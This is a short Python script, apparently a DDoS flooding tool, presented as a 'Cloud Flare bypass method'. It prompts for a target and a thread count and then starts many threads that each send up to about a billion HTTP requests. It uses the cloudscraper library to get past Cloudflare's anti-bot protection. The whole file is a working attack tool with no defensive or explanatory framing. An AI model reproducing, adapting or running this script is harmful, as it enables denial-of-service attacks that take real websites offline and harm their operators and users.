#from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
import cloudscraper
import random
import threading
import os
os.system('cls||clear')
scraper = cloudscraper.create_scraper()

print('''
CLOUD FLARE BYPASS METHOD
''')
ip = input("Target: ")
port = int(input("Port: "))
th = int(input("Threads: "))

url = "http://" + str(ip)


def randomip():
	randip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
	return (randip)


print("[>>>] Starting the attack [<<<]")

inf = 1000000000


def attack():
	for i in range(1, inf):
		try:
			scraper.get(url)
		except:
			pass


def threader():
	global threads
	threads = []
	for i in range(th):
		t = threading.Thread(target=attack)
		threads.append(t)
		t.start()


threader()
